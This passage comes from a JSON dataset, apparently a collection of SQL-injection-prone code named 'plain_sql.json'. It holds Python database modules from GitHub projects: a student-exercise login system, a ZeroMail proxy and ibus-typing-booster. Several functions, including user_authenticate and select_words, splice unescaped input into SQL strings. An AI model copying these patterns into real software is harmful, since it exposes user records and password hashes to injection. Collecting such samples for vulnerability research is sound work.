internally.\n        Also \"state\" must not given explicitly; it is implicitly set to\n        \"no_agreement\".\n        Raises an exception if the user already exists, or the dict contains\n        invalid keys or is missing required keys.\n        \"\"\"\n        if 'passhash' in kwargs:\n            raise DBException(\"Supplied arguments include passhash (invalid) (1).\")\n        # Make a copy of the dict. Change password to passhash (hashing it),\n        # and set 'state' to \"no_agreement\".\n        if user_obj is None:\n            # Use the kwargs\n            fields = copy.copy(kwargs)\n        else:\n            # Use the user object\n            fields = dict(user_obj)\n        if 'password' in fields:\n            fields['passhash'] = _passhash(fields['password'])\n            del fields['password']\n        if 'role' in fields:\n            # Convert role to rolenm\n            fields['rolenm'] = str(user_obj.role)\n            del fields['role']\n        if user_obj is None:\n            fields['state'] = \"no_agreement\"\n            # else, we'll trust the user, but it SHOULD be \"no_agreement\"\n            # (We can't change it because then the user object would not\n            # reflect the DB).\n        if 'local_password' in fields:\n            del fields['local_password']\n        # Execute the query.\n        return self.insert(fields, \"login\", self.login_fields, dry=dry)\n\n    def update_user(self, login, dry=False, **kwargs):\n        \"\"\"Updates fields of a particular user. login is the name of the user\n        to update. The dict contains the fields which will be modified, and\n        their new values. If any value is omitted from the dict, it does not\n        get modified. login and studentid may not be modified.\n        Passhash may be modified by supplying a \"password\" field, in\n        cleartext, not a hashed password.\n\n        Note that no checking is done. It is expected this function is called\n        by a trusted source. In particular, it allows the password to be\n        changed without knowing the old password. The caller should check\n        that the user knows the existing password before calling this function\n        with a new one.\n        \"\"\"\n        if 'passhash' in kwargs:\n            raise DBException(\"Supplied arguments include passhash (invalid) (2).\")\n        if \"password\" in kwargs:\n            kwargs = copy.copy(kwargs)\n            kwargs['passhash'] = _passhash(kwargs['password'])\n            del kwargs['password']\n        return self.update({\"login\": login}, kwargs, \"login\",\n            self.login_fields, self.login_primary, [\"login\", \"studentid\"],\n            dry=dry)\n\n    def get_user(self, login, dry=False):\n        \"\"\"Given a login, returns a User object containing details looked up\n        in the DB.\n\n        Raises a DBException if the login is not found in the DB.\n        \"\"\"\n        userdict = self.get_single({\"login\": login}, \"login\",\n            self.login_fields, self.login_primary,\n            error_notfound=\"get_user: No user with that login name\", dry=dry)\n        if dry:\n            return userdict     # Query string\n        # Package into a User object\n        return user.User(**userdict)\n\n    def get_users(self, dry=False):\n        \"\"\"Returns a list of all users in the DB, as User objects.\n        \"\"\"\n        userdicts = self.get_all(\"login\", self.login_fields, dry=dry)\n        if dry:\n            return userdicts    # Query string\n        # Package into User objects\n        return [user.User(**userdict) for userdict in userdicts]\n\n    def get_user_loginid(self, login, dry=False):\n        \"\"\"Given a login, returns the integer loginid for this user.\n\n        Raises a DBException if the login is not found in the DB.\n        \"\"\"\n        userdict = self.get_single({\"login\": login}, \"login\",\n            ['loginid'], self.login_primary,\n            error_notfound=\"get_user_loginid: No user with that login name\",\n            dry=dry)\n        if dry:\n            return userdict     # Query string\n        return userdict['loginid']\n\n    def user_authenticate(self, login, password, dry=False):\n        \"\"\"Performs a password authentication on a user. Returns True if\n        \"passhash\" is the correct passhash for the given login, False\n        if the passhash does not match the password in the DB,\n        and None if the passhash in the DB is NULL.\n        Also returns False if the login does not exist (so if you want to\n        differentiate these cases, use get_user and catch an exception).\n        \"\"\"\n        query = \"SELECT passhash FROM login WHERE login = '%s';\" % login\n        if dry: return query\n        result = self.db.query(query)\n        if result.ntuples() == 1:\n            # Valid username. Check password.\n            passhash = result.getresult()[0][0]\n            if passhash is None:\n                return None\n            return _passhash(password) == passhash\n        else:\n            return False\n\n    # PROBLEM AND PROBLEM ATTEMPT FUNCTIONS #\n\n    def get_problem_problemid(self, exercisename, dry=False):\n        \"\"\"Given an exercise name, returns the associated problemID.\n        If the exercise name is NOT in the database, it inserts it and returns\n        the new problemID. Hence this may mutate the DB, but is idempotent.\n        \"\"\"\n        try:\n            d = self.get_single({\"identifier\": exercisename}, \"problem\",\n                ['problemid'], frozenset([\"identifier\"]),\n                dry=dry)\n            if dry:\n                return d        # Query string\n        except DBException:\n            if dry:\n                # Shouldn't try again, must have failed for some other reason\n                raise\n            # if we failed to get a problemid, it was probably because\n            # the exercise wasn't in the db. So lets insert it!\n            #\n            # The insert can fail if someone else simultaneously does\n            # the insert, so if the insert fails, we ignore the problem. \n            try:\n                self.insert({'identifier': exercisename}, \"problem\",\n                        frozenset(['identifier']))\n            except Exception, e:\n                pass\n\n            # Assuming the insert succeeded, we should be able to get the\n            # problemid now.\n            d = self.get_single({\"identifier\": exercisename}, \"problem\",\n                ['problemid'], frozenset([\"identifier\"]))\n\n        return d['problemid']\n\n    def insert_problem_attempt(self, login, exercisename, date, complete,\n        attempt, dry=False):\n        \"\"\"Inserts the details of a problem attempt into the database.\n        exercisename: Name of the exercise. (identifier field of problem\n            table). If this exercise does not exist, also creates a new row in\n            the problem table for this exercise name.\n        login: Name of the user submitting the attempt. (login field of the\n            login table).\n        date: struct_time, the date this attempt was made.\n        complete: bool. Whether the test passed or not.\n        attempt: Text of the attempt.\n\n        Note: Even if dry, will still physically call get_problem_problemid,\n        which may mutate the DB, and get_user_loginid, which may fail.\n        \"\"\"\n        problemid = self.get_problem_problemid(exercisename)\n        loginid = self.get_user_loginid(login)  # May raise a DBException\n\n        return self.insert({\n                'problemid': problemid,\n                'loginid': loginid,\n                'date': date,\n                'complete': complete,\n                'attempt': attempt,\n            }, 'problem_attempt',\n            frozenset(['problemid','loginid','date','complete','attempt']),\n            dry=dry)\n\n    def get_problem_attempt_last_text(self, login, exercisename, dry=False):\n        \"\"\"Given a login name and exercise name, returns the text of the\n        last submitted attempt for this question. Returns None if the user has\n        not made an attempt on this problem.\n\n        Note: Even if dry, will still physically call get_problem_problemid,\n        which may mutate the DB, and get_user_loginid, which may fail.\n        \"\"\"\n        problemid = self.get_problem_problemid(exercisename)\n        loginid = self.get_user_loginid(login)  # May raise a DBException\n        # \"Get the single newest attempt made by this user for this problem\"\n        query = (\"SELECT attempt FROM problem_attempt \"\n            \"WHERE loginid = %d AND problemid = %d \"\n            \"ORDER BY date DESC \"\n            \"LIMIT 1;\" % (loginid, problemid))\n        if dry: return query\n        result = self.db.query(query)\n        if result.ntuples() == 1:\n            # The user has made at least 1 attempt. Return the newest.\n            return result.getresult()[0][0]\n        else:\n            return None\n\n    def close(self):\n        \"\"\"Close the DB connection. Do not call any other functions after\n        this. (The behaviour of doing so is undefined).\n        \"\"\"\n        self.db.close()\n        self.open = False\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/imachug/ZeroMailProxy/blob/0a0dd5900c25092e076364a44d28e39e3b30740f",
        "file_path": "/zeromail.py",
        "source": "import sqlite3, cryptlib, os, json, base64, errno, time\n\ncurrent_directory = os.path.dirname(os.path.realpath(__file__))\n\n\nclass ZeroMail(object):\n\tdef __init__(self, zeronet_directory, zeroid, priv):\n\t\tself.zeronet_directory = zeronet_directory\n\t\tself.zeroid = zeroid\n\t\tself.privkey = priv\n\n\t\tself.zeromail_data = zeronet_directory + \"data/1MaiL5gfBM1cyb4a8e3iiL8L5gXmoAJu27/data/users/\" + zeroid + \"/data.json\"\n\t\tself.cache_directory = current_directory + \"/cache/\" + base64.b64encode(zeroid)\n\t\ttry:\n\t\t\tos.makedirs(self.cache_directory)\n\t\texcept OSError as e:\n\t\t\tif e.errno != errno.EEXIST:\n\t\t\t\traise\n\n\t\tself.conn = sqlite3.connect(zeronet_directory + 'data/1MaiL5gfBM1cyb4a8e3iiL8L5gXmoAJu27/data/users/zeromail.db')\n\t\tself.cursor = self.conn.cursor()\n\n\tdef get_secrets(self, from_date_added=0):\n\t\tsecrets = []\n\t\tfor row in self.cursor.execute('SELECT encrypted, json_id, date_added FROM secret WHERE date_added > %s ORDER BY date_added DESC' % from_date_added):\n\t\t\taes_key, json_id, date_added = cryptlib.eciesDecrypt(row[0], self.privkey), row[1], row[2]\n\t\t\tif aes_key != None:\n\t\t\t\tsecrets.append([aes_key, json_id])\n\t\t\tfrom_date_added = max(from_date_added, date_added)\n\t\treturn (secrets, from_date_added)\n\tdef update_secrets(self):\n\t\told_secrets = []\n\t\tfrom_date_added = 0\n\t\ttry:\n\t\t\twith open(self.cache_directory + \"/secrets.json\", \"r\") as f:\n\t\t\t\tcache = json.loads(f.read())\n\t\t\t\told_secrets = cache[\"secrets\"]\n\t\t\t\tfrom_date_added = cache[\"date_added\"]\n\t\texcept:\n\t\t\tpass\n\n\t\tnew_secrets, date_added = self.get_secrets(from_date_added)\n\t\tsecrets = old_secrets + new_secrets\n\n\t\twith open(self.cache_directory + \"/secrets.json\", \"w\") as f:\n\t\t\tcache = dict(secrets=secrets, date_added=date_added)\n\t\t\tf.write(json.dumps(cache))\n\n\t\treturn secrets\n\n\tdef get_messages(self, secrets, from_date_added=0):\n\t\tdate_added = from_date_added\n\n\t\tres = dict()\n\t\tfor s in secrets:\n\t\t\taes_key, json_id = s[0], s[1]\n\t\t\tmessages = self.cursor.execute(\"\"\"\n\t\t\t\tSELECT\n\t\t\t\t\tencrypted,\n\t\t\t\t\tdate_added,\n\t\t\t\t\tkeyvalue.value AS cert_user_id\n\t\t\t\tFROM message\n\n\t\t\t\tLEFT JOIN json\n\t\t\t\tON (message.json_id = json.json_id)\n\n\t\t\t\tLEFT JOIN json AS json_content\n\t\t\t\tON (json.directory = json_content.directory AND json_content.file_name = \"content.json\")\n\n\t\t\t\tLEFT JOIN keyvalue\n\t\t\t\tON (keyvalue.json_id = json_content.json_id)\n\n\t\t\t\tWHERE\n\t\t\t\t\tmessage.json_id = ? AND\n\t\t\t\t\tdate_added > ?\n\t\t\t\tORDER BY date_added DESC\n\t\t\t\"\"\", (json_id, from_date_added))\n\t\t\tfor m in messages:\n\t\t\t\tmessage = m[0].split(',')\n\t\t\t\tiv, encrypted_text = message[0], message[1]\n\t\t\t\tresult = cryptlib.aesDecrypt(iv, encrypted_text, aes_key)\n\t\t\t\tif result != None:\n\t\t\t\t\tres[str(m[1])] = dict(raw=result, cert_user_id=m[2])\n\t\t\t\tdate_added = max(date_added, m[1])\n\n\t\treturn (res, date_added)\n\tdef update_messages(self, secrets):\n\t\told_messages = dict()\n\t\tfrom_date_added = 0\n\t\ttry:\n\t\t\twith open(self.cache_directory + \"/messages.json\", \"r\") as f:\n\t\t\t\tcache = json.loads(f.read())\n\t\t\t\told_messages = cache[\"messages\"]\n\t\t\t\tfrom_date_added = cache[\"date_added\"]\n\t\texcept:\n\t\t\tpass\n\n\t\tnew_messages, date_added = self.get_messages(secrets, from_date_added)\n\n\t\tmessages = old_messages.copy()\n\t\tmessages.update(new_messages)\n\n\t\twith open(self.cache_directory + \"/messages.json\", \"w\") as f:\n\t\t\tcache = dict(messages=messages, date_added=date_added)\n\t\t\tf.write(json.dumps(cache))\n\n\t\treturn messages\n\n\tdef remove_message(self, secrets, message):\n\t\tmessages = self.update_messages(secrets)\n\t\tmessages.pop(str(message))\n\n\t\tdate_added = None\n\t\twith open(self.cache_directory + \"/messages.json\", \"r\") as f:\n\t\t\tdate_added = json.loads(f.read())[\"date_added\"]\n\n\t\twith open(self.cache_directory + \"/messages.json\", \"w\") as f:\n\t\t\tcache = dict(messages=messages, date_added=date_added)\n\t\t\tf.write(json.dumps(cache))\n\n\tdef load_secrets_sent(self):\n\t\tdata = None\n\t\twith open(self.zeromail_data, \"r\") as f:\n\t\t\tdata = json.loads(f.read())\n\n\t\tsecrets_sent = data[\"secrets_sent\"]\n\t\tsecrets_sent = cryptlib.eciesDecrypt(secrets_sent, self.privkey)\n\t\tsecrets_sent = json.loads(secrets_sent)\n\t\treturn secrets_sent\n\tdef get_secret(self, address):\n\t\tsecrets_sent = self.load_secrets_sent()\n\t\tif address in secrets_sent:\n\t\t\treturn secrets_sent[address].split(\":\", 1)[1]\n\t\treturn self.add_secret(address)\n\n\tdef send(self, address, subject, body, to):\n\t\tsecret = self.get_secret(address)\n\t\tmessage = json.dumps(dict(subject=subject, body=body, to=to))\n\t\taes, iv, encrypted = cryptlib.aesEncrypt(message, secret)\n\n\t\tdata = None\n\t\twith open(self.zeromail_data, \"r\") as f:\n\t\t\tdata = json.loads(f.read())\n\t\tprint data\n\n\t\tdate = int(time.time() * 1000)\n\t\tdata[\"message\"][str(date)] = iv + \",\" + encrypted\n\t\tdata[\"date_added\"] = int(time.time() * 1000)\n\n\t\twith open(self.zeromail_data, \"w\") as f:\n\t\t\tf.write(json.dumps(data))",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/mike-fabian/ibus-typing-booster/blob/63a7788fd0997fe024ce86dcd970736bd70f422a",
        "file_path": "/ibus-typing-booster/engine/tabsqlitedb.py",
        "source": "# -*- coding: utf-8 -*-\n# vim:et sts=4 sw=4\n#\n# ibus-typing-booster - The Tables engine for IBus\n#\n# Copyright (c) 2011-2012 Anish Patil <apatil@redhat.com>\n# Copyright (c) 2012 Mike FABIAN <mfabian@redhat.com>\n#\n# This program is free software: you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#  This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#  You should have received a copy of the GNU General Public License\n# along with this program.  If not, see <http://www.gnu.org/licenses/>\n\nimport os\nimport os.path as path\nimport sys\nimport sqlite3\nimport uuid\nimport time\nimport re\nimport hunspell_suggest\n\nuser_database_version = '0.61'\n\npatt_r = re.compile(r'c([ea])(\\d):(.*)')\npatt_p = re.compile(r'p(-{0,1}\\d)(-{0,1}\\d)')\n\nclass ImeProperties:\n    def __init__(self, configfile_path=None):\n        '''\n        configfile_path is the full path to the config file, for example\n        /usr/share/ibus-typing-booster/hunspell-tables/en_US.conf\n        '''\n        self.ime_property_cache = {}\n        if configfile_path.find('typing-booster:') > 0:\n            configfile_path=configfile_path.replace(\n                'typing-booster:','')\n        if os.path.exists(configfile_path) and os.path.isfile(configfile_path):\n            comment_patt = re.compile('^#')\n            for line in file(configfile_path):\n                if not comment_patt.match(line):\n                    attr,val = line.strip().split ('=', 1)\n                    self.ime_property_cache[attr.strip()]= val.strip()\n        else:\n            sys.stderr.write(\"Error: ImeProperties: No such file: %s\" %configfile_path)\n\n    def get(self, key):\n        if key in self.ime_property_cache:\n            return self.ime_property_cache[key]\n        else:\n            return None\n\nclass tabsqlitedb:\n    '''Phrase databases for ibus-typing-booster\n\n    The phrases tables in the databases have columns with the names:\n\n    id, mlen, clen, input_phrase, phrase, freq, user_freq\n\n    There are 3 databases, sysdb, userdb, mudb.\n\n    Overview over the meaning of values in the freq and user_freq columns:\n\n              freq                   user_freq\n    sysdb      1                     0\n\n    user_db    0 system phrase       >= 1\n              -1 user phrase         >= 1\n    mudb\n               2 new system phrase   >= 1\n               1 old system phrase   >= 1\n              -2 new user phrase     >= 1\n              -3 old user phrase     >= 1\n\n    sysdb: Database with the suggestions from the hunspell dictionaries\n        user_freq = 0 always.\n        freq      = 1 always.\n\n        Actually there is no Sqlite3 database called sysdb, these\n        are the suggestions coming from hunspell_suggest, i.e. from\n        grepping the hunspell dictionaries and from pyhunspell. But\n        these suggestions are supplied as tuples or lists in the same\n        form as the database rows (Historic note: ibus-typing-booster\n        started as a fork of ibus-table, in ibus-table sysdb is a\n        Sqlite3 database which is installed systemwide and readonly\n        for the user)\n\n    user_db: Database on disk where the phrases learned from the user are stored\n        user_freq >= 1: The number of times the user has used this phrase\n        freq = -1: user defined phrase, hunspell_suggest does not suggest\n                   a phrase like this.\n        freq = 0:  system phrase, hunspell_suggest does suggest\n                   such a phrase.\n\n        (Note: If the hunspell dictionary is updated, what could be suggested\n        by hunspell might change. Is it necessary to update the contents\n        of user_db then to reflect this?)\n\n        Data is written to user_db only when ibus-typing-booster exits.\n        Until then, the data learned from the user is stored only in mudb.\n\n    mudb: Database in memory where the phrases learned from the user are stored\n        user_freq >= 1: The number of times the user has used this phrase\n        freq =  2: new system phrase, i.e. this phrase originally came from\n                   hunspell_suggest during the current session, it did not\n                   come from user_db.\n        freq =  1: old system phrase, i.e. this phrase came from user_db\n                   but  was marked there with freq = 0, i.e. it is a\n                   phrase which could be suggest by hunspell_suggest.\n        freq = -2: new user phrase, i.e. this is a phrase which hunspell_suggest\n                   cannot suggest and which was typed by the user in the current\n                   session.\n        freq = -3: old user phrase, i.e. this is also a phrase which hunspell_suggest\n                   cannot suggest. But it was already typed by the user in a previous\n                   session and has been saved on exit of ibus-typing-booster\n                   to user_db. The current session got it from user_db.\n    '''\n    def __init__(self, name = 'table.db', user_db = None, filename = None ):\n        # use filename when you are creating db from source\n        # use name when you are using db\n        self._phrase_table_column_names = ['id', 'mlen', 'clen', 'input_phrase', 'phrase','freq','user_freq']\n\n        self.old_phrases=[]\n\n        self._conf_file_path = \"/usr/share/ibus-typing-booster/hunspell-tables/\"\n\n        self.ime_properties = ImeProperties(self._conf_file_path+filename)\n\n        # share variables in this class:\n        self._mlen = int(self.ime_properties.get(\"max_key_length\"))\n\n        self._m17ndb = 'm17n'\n        self._m17n_mim_name = \"\"\n        self.lang_chars = self.ime_properties.get('lang_chars')\n        if self.lang_chars != None:\n            self.lang_chars = self.lang_chars.decode('utf8')\n        else:\n            self.lang_chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'\n\n        self.encoding = self.ime_properties.get('encoding')\n\n        self.hunspell_obj = hunspell_suggest.Hunspell(\n            lang=self.ime_properties.get('languages'),\n            dict_name=self.ime_properties.get(\"hunspell_dict\"),\n            aff_name=self.ime_properties.get(\"hunspell_dict\").replace('.dic', '.aff'),\n            encoding=self.encoding,\n            lang_chars=self.lang_chars)\n\n        self.startchars = self.get_start_chars ()\n        user_db = self.ime_properties.get(\"name\")+'-user.db'\n        # user database:\n        if user_db != None:\n            home_path = os.getenv (\"HOME\")\n            tables_path = path.join (home_path, \".local/share/.ibus\",  \"hunspell-tables\")\n            if not path.isdir (tables_path):\n                os.makedirs (tables_path)\n            user_db = path.join (tables_path, user_db)\n            if not path.exists(user_db):\n                sys.stderr.write(\"The user database %(udb)s does not exist yet.\\n\" %{'udb': user_db})\n            else:\n                try:\n                    desc = self.get_database_desc (user_db)\n                    if desc == None \\\n                        or desc[\"version\"] != user_database_version \\\n                        or self.get_number_of_columns_of_phrase_table(user_db) != len(self._phrase_table_column_names):\n                        sys.stderr.write(\"The user database %(udb)s seems to be incompatible.\\n\" %{'udb': user_db})\n                        if desc == None:\n                            sys.stderr.write(\"There is no version information in the database.\\n\")\n                        elif desc[\"version\"] != user_database_version:\n                            sys.stderr.write(\"The version of the database does not match (too old or too new?).\\n\")\n                            sys.stderr.write(\"ibus-typing-booster wants version=%s\\n\" %user_database_version)\n                            sys.stderr.write(\"But the  database actually has version=%s\\n\" %desc[\"version\"])\n                        elif self.get_number_of_columns_of_phrase_table(user_db) != len(self._phrase_table_column_names):\n                            sys.stderr.write(\"The number of columns of the database does not match.\\n\")\n                            sys.stderr.write(\"ibus-typing-booster expects %(col)s columns.\\n\"\n                                %{'col': len(self._phrase_table_column_names)})\n                            sys.stderr.write(\"But the database actually has %(col)s columns.\\n\"\n                                %{'col': self.get_number_of_columns_of_phrase_table(user_db)})\n                        sys.stderr.write(\"Trying to recover the phrases from the old, incompatible database.\\n\")\n                        self.old_phrases = self.extract_user_phrases( user_db )\n                        new_name = \"%s.%d\" %(user_db, os.getpid())\n                        sys.stderr.write(\"Renaming the incompatible database to \\\"%(name)s\\\".\\n\" %{'name': new_name})\n                        os.rename(user_db, new_name)\n                        sys.stderr.write(\"Creating a new, empty database \\\"%(name)s\\\".\\n\"  %{'name': user_db})\n                        self.init_user_db(user_db)\n                        sys.stderr.write(\"If user phrases were successfully recovered from the old,\\n\")\n                        sys.stderr.write(\"incompatible database, they will be used to initialize the new database.\\n\")\n                    else:\n                        sys.stderr.write(\"Compatible database %(db)s found.\\n\" %{'db': user_db})\n                except:\n                    import traceback\n                    traceback.print_exc()\n        else:\n            user_db = \":memory:\"\n\n        # open user phrase database\n        try:\n            sys.stderr.write(\"Connect to the database %(name)s.\\n\" %{'name': user_db})\n            self.db = sqlite3.connect(user_db)\n            self.db.execute('PRAGMA page_size = 8192; ')\n            self.db.execute('PRAGMA cache_size = 20000; ')\n            self.db.execute('PRAGMA temp_store = MEMORY; ')\n            self.db.execute('PRAGMA synchronous = OFF; ')\n            self.db.execute('ATTACH DATABASE \"%s\" AS user_db;' % user_db)\n        except:\n            sys.stderr.write(\"Could not open the database %(name)s.\\n\" %{'name': user_db})\n            new_name = \"%s.%d\" %(user_db, os.getpid())\n            sys.stderr.write(\"Renaming the incompatible database to \\\"%(name)s\\\".\\n\" %{'name': new_name})\n            os.rename(user_db, new_name)\n            sys.stderr.write(\"Creating a new, empty database \\\"%(name)s\\\".\\n\"  %{'name': user_db})\n            self.init_user_db(user_db)\n            self.db.execute('ATTACH DATABASE \"%s\" AS user_db;' % user_db)\n        self.create_tables(\"user_db\")\n        if self.old_phrases:\n            # (mlen, phrase, freq, user_freq)\n            phrases = filter(lambda x: x[0] > 1, self.old_phrases)\n            phrases = map(lambda x: [x[1]] + list(x[1:]), phrases)\n            map(self.u_add_phrase, phrases)\n            self.db.commit()\n\n        # do not call this always on intialization for the moment.\n        # It makes the already slow python engine/main.py --xml\n        # to list the engines even slower and may break the listing\n        # of the engines completely if there is a problem with\n        # optimizing the databases. Probably bring this back as an\n        # option later if the code in self.optimize_database() is\n        # improved to do anything useful.\n        #try:\n        #    self.optimize_database()\n        #except:\n        #    print \"exception in optimize_database()\"\n        #    import traceback\n        #    traceback.print_exc ()\n\n        # try create all hunspell-tables in user database\n        self.create_indexes (\"user_db\",commit=False)\n        self.generate_userdb_desc ()\n\n        # attach mudb for working process\n        mudb = \":memory:\"\n        self.db.execute ('ATTACH DATABASE \"%s\" AS mudb;' % mudb )\n        self.create_tables (\"mudb\")\n\n    def __parse_conf_file(self,conf_file=\"/usr/share/ibus-typing-booster/hunspell-tables/en_US.conf\"):\n        key_val_dict = {}\n        if conf_file.find('typing-booster:') > 0 :\n            conf_file=conf_file.replace('typing-booster:','')\n        comment_patt = re.compile('^#')\n        for line in file(conf_file):\n            if not comment_patt.match(line):\n                attr,val = line.strip().split ('=', 1)\n                key_val_dict[attr.strip()]= val.strip()\n        return key_val_dict\n\n    def update_phrase (self, entry, database='user_db'):\n        '''update phrase freqs'''\n        input_phrase, phrase, freq, user_freq = entry\n        sqlstr = '''UPDATE %(database)s.phrases\n                    SET user_freq = %(user_freq)s\n                    WHERE mlen = %(mlen)s\n                    AND clen = %(clen)s\n                    AND input_phrase = \"%(input_phrase)s\"\n                    AND phrase = \"%(phrase)s\";\n        ''' %{'database':database,\n              'user_freq': user_freq,\n              'mlen': len(input_phrase),\n              'clen': len(phrase),\n              'input_phrase': input_phrase,\n              'phrase': phrase}\n        self.db.execute(sqlstr)\n        self.db.commit()\n\n    def sync_usrdb (self):\n        # we need to update the user_db\n        #print 'sync userdb'\n        mudata = self.db.execute ('SELECT * FROM mudb.phrases;').fetchall()\n        data_u = filter ( lambda x: x[-2] in [1,-3], mudata)\n        data_a = filter ( lambda x: x[-2]==2, mudata)\n        data_n = filter ( lambda x: x[-2]==-2, mudata)\n        data_u = map (lambda x: (x[3],x[-3],x[-2],x[-1] ), data_u)\n        data_a = map (lambda x: (x[3],x[-3],0,x[-1] ), data_a)\n        data_n = map (lambda x: (x[3],x[-3],-1,x[-1] ), data_n)\n        map (self.update_phrase, data_u)\n        #print self.db.execute('select * from user_db.phrases;').fetchall()\n        map (self.u_add_phrase,data_a)\n        map (self.u_add_phrase,data_n)\n        self.db.commit ()\n\n    def create_tables (self, database):\n        '''Create table for the phrases.'''\n        try:\n            self.db.execute( 'PRAGMA cache_size = 20000; ' )\n            # increase the cache size to speedup sqlite enquiry\n        except:\n            pass\n        sqlstr = '''CREATE TABLE IF NOT EXISTS %s.phrases\n                    (id INTEGER PRIMARY KEY AUTOINCREMENT,\n                    mlen INTEGER, clen INTEGER,\n                    input_phrase TEXT, phrase TEXT,\n                    freq INTEGER, user_freq INTEGER);''' % database\n        self.db.execute(sqlstr)\n        self.db.commit()\n\n    def get_start_chars (self):\n        '''return possible start chars of IME'''\n        try:\n            return self.ime_properties.get('start_chars')\n        except:\n            return ''\n\n    def u_add_phrase (self,nphrase):\n        '''Add a phrase to userdb'''\n        self.add_phrase (nphrase,database='user_db',commit=False)\n\n    def add_phrase (self, aphrase, database = 'main',commit=True):\n        '''\n        Add phrase to database, phrase is a object of\n        (input_phrase, phrase, freq ,user_freq)\n        '''\n        try:\n            input_phrase,phrase,freq,user_freq = aphrase\n        except:\n            input_phrase,phrase,freq = aphrase\n            user_freq = 0\n\n        select_sqlstr= '''\n        SELECT * FROM %(database)s.phrases\n        WHERE input_phrase = :input_phrase AND phrase = :phrase\n        ;'''  %{'database': database}\n        select_sqlargs = {'input_phrase': input_phrase, 'phrase': phrase}\n        if self.db.execute(select_sqlstr, select_sqlargs).fetchall():\n            # there is already such a phrase, i.e. add_phrase was called\n            # in error, do nothing to avoid duplicate entries.\n            return\n\n        insert_sqlstr = '''\n        INSERT INTO %(database)s.phrases\n        (mlen, clen, input_phrase, phrase, freq, user_freq)\n        VALUES ( :mlen, :clen, :input_phrase, :phrase, :freq, :user_freq)\n        ;''' %{'database': database}\n        insert_sqlargs = {'mlen': len(input_phrase), 'clen': len(phrase),\n                          'input_phrase': input_phrase, 'phrase': phrase,\n                          'freq': freq, 'user_freq': user_freq}\n        try:\n            self.db.execute (insert_sqlstr, insert_sqlargs)\n            if commit:\n                self.db.commit()\n        except Exception:\n            import traceback\n            traceback.print_exc()\n\n    def optimize_database (self, database='main'):\n        sqlstr = '''\n            CREATE TABLE tmp AS SELECT * FROM %(database)s.phrases;\n            DELETE FROM %(database)s.phrases;\n            INSERT INTO %(database)s.phrases SELECT * FROM tmp ORDER BY\n            input_phrase, mlen ASC, user_freq DESC, freq DESC, id ASC;\n            DROP TABLE tmp;''' %{'database':database,}\n        self.db.executescript (sqlstr)\n        self.db.executescript (\"VACUUM;\")\n        self.db.commit()\n\n    def drop_indexes(self, database):\n        '''Drop the index in database to reduce it's size'''\n        sqlstr = '''\n            DROP INDEX IF EXISTS %(database)s.phrases_index_p;\n            DROP INDEX IF EXISTS %(database)s.phrases_index_i;\n            VACUUM;\n            ''' % { 'database':database }\n\n        self.db.executescript (sqlstr)\n        self.db.commit()\n\n    def create_indexes(self, database, commit=True):\n        sqlstr = '''\n            CREATE INDEX IF NOT EXISTS %(database)s.phrases_index_p ON phrases\n            (input_phrase, mlen ASC, freq DESC, id ASC);\n            CREATE INDEX IF NOT EXISTS %(database)s.phrases_index_i ON phrases\n            (phrase, mlen ASC);''' %{'database':database}\n        self.db.executescript (sqlstr)\n        if commit:\n            self.db.commit()\n\n    def select_words(self, input_phrase):\n        '''\n        Get phrases from database by tab_key objects\n        ( which should be equal or less than the max key length)\n        This method is called in hunspell_table.py by passing UserInput held data\n        Returns a list of matches where each match is a tuple\n        in the form of a database row, i.e. returns something like\n        [(id, mlen, clen, input_phrase, phrase, freq, user_freq), ...]\n        '''\n        if type(input_phrase) != type(u''):\n            input_phrase = input_phrase.decode('utf8')\n        # limit length of input phrase to max key length\n        # (Now that the  input_phrase is stored in a single\n        # column of type TEXT in sqlite3, this limit can be set as high\n        # as the maximum string length in sqlite3\n        # (by default 10^9, see http://www.sqlite.org/limits.html))\n        input_phrase = input_phrase[:self._mlen]\n        sqlstr = '''SELECT * FROM user_db.phrases WHERE phrase LIKE \"%(input_phrase)s%%\"\n                    UNION ALL\n                    SELECT  * FROM mudb.phrases WHERE phrase LIKE \"%(input_phrase)s%%\"\n                    ORDER BY user_freq DESC, freq DESC, id ASC, mlen ASC\n                    limit 1000;''' %{'input_phrase': input_phrase}\n        result = self.db.execute(sqlstr).fetchall()\n        hunspell_list = self.hunspell_obj.suggest(input_phrase)\n        for ele in hunspell_list:\n            result.append(tuple(ele))\n\n        usrdb={}\n        mudb={}\n        sysdb={}\n        map(lambda x: sysdb.update([(x[3:-2],x[:])]), filter(lambda x: not x[-1], result))\n        map(lambda x: usrdb.update([(x[3:-2], x[:])]), filter(lambda x: (x[-2] in [0,-1]) and x[-1], result))\n        map(lambda x: mudb.update([(x[3:-2], x[:])]), filter(lambda x: (x[-2] not in [0,-1]) and x[-1], result))\n\n        _cand = mudb.values()\n        map(_cand.append, filter(lambda x: x, map(lambda key: key not in mudb and usrdb[key], usrdb)))\n        map(_cand.append, filter(lambda x: x, map(lambda key: key not in mudb and key not in usrdb and sysdb[key], sysdb)))\n        _cand.sort(cmp=(lambda x,y:\n                        -(cmp(x[-1], y[-1]))    # user_freq descending\n                        or (cmp(x[1], y[1]))    # len(input_phrase) ascending\n                        or -(cmp(x[-2], y[-2])) # freq descending\n                        or (cmp(x[0], y[0]))    # id ascending\n                    ))\n        return _cand[:]\n\n\n    def get_all_values(self,d_name='main',t_name='inks'):\n        sqlstr = 'SELECT * FROM '+d_name+'.'+t_name+';'\n        _result = self.db.execute( sqlstr).fetchall()\n        return _result\n\n    def get_phrase_table_column_names (self):\n        '''get a list of phrase table columns name'''\n        return self._phrase_table_column_names[:]\n\n    def generate_userdb_desc (self):\n        try:\n            sqlstring = 'CREATE TABLE IF NOT EXISTS user_db.desc (name PRIMARY KEY, value);'\n            self.db.executescript (sqlstring)\n            sqlstring = 'INSERT OR IGNORE INTO user_db.desc  VALUES (?, ?);'\n            self.db.execute (sqlstring, ('version', user_database_version))\n            sqlstring = 'INSERT OR IGNORE INTO user_db.desc  VALUES (?, DATETIME(\"now\", \"localtime\"));'\n            self.db.execute (sqlstring, (\"create-time\", 